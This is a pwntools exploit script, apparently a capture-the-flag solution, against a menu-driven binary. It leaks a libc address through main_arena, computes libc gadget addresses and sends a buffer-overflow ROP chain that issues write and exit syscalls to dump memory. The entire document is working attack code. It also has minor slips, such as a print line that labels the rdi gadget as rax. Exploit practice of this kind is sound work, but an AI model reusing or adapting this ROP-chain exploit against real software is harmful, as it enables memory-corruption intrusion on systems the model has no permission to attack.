from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

def leak():
    io.sendlineafter(b'1(yes)', b'1')
    io.sendlineafter(b'Tortilla', b'1')
    io.sendlineafter(b'1(yes)', b'0')
    io.sendlineafter(b'1(yes)', b'0')
    io.recvuntil(b'number: ')


def _write(payload):
    io.sendlineafter(b'1(yes)', b'1')
    io.sendlineafter(b'Tortilla', b'1')
    io.sendlineafter(b'1(yes)', b'1')
    io.sendlineafter(b'need', payload)
    io.sendlineafter(b'1(yes)', b'0')

io = start()

offset = 32

leak()

for _ in range(27):
    io.recv(8)
main_arena = u64(io.recv(6).ljust(8, b'\x00'))
print(f"leak      @ 0x{main_arena:x}")
libc.address = main_arena - 341 - 0x235c40

print(f"libc base @ 0x{libc.address:x}")

ret_gadget = 0x000000000040101a
print(f"ret_gadget @ 0x{ret_gadget:x}")

pop_rax_gadget = 0x0000000000045eb0 + libc.address
pop_rdi_gadget = 0x000000000002a3e5 + libc.address
pop_rsi_gadget = 0x000000000002be51 + libc.address
pop_rdx_r12_gadget = 0x000000000011f497 + libc.address
syscall_gadget = 0x0000000000091396 + libc.address

print(f"pop_rax_gadget @ 0x{pop_rdi_gadget:x}")
print(f"pop_rdi_gadget @ 0x{pop_rdi_gadget:x}")
print(f"pop_rsi_gadget @ 0x{pop_rsi_gadget:x}")
print(f"pop_rdx_r12_gadget @ 0x{pop_rdx_r12_gadget:x}")
print(f"syscall_gadget @ 0x{syscall_gadget:x}")


flag_addr = (libc.symbols.printf - 0xdeadbeef) // 4096 * 4096


payload = b'A' * 32 + flat(ret_gadget)

payload += flat(pop_rdi_gadget) + flat(0x1)
payload += flat(pop_rsi_gadget) + flat(flag_addr)
payload += flat(pop_rdx_r12_gadget) + flat(256) + flat(0x2)
payload += flat(pop_rax_gadget) + flat(0x1)
payload += flat(syscall_gadget)
payload += flat(pop_rax_gadget) + flat(60)
payload += flat(pop_rdi_gadget) + flat(0)
payload += flat(syscall_gadget)



_write(payload)


io.interactive()
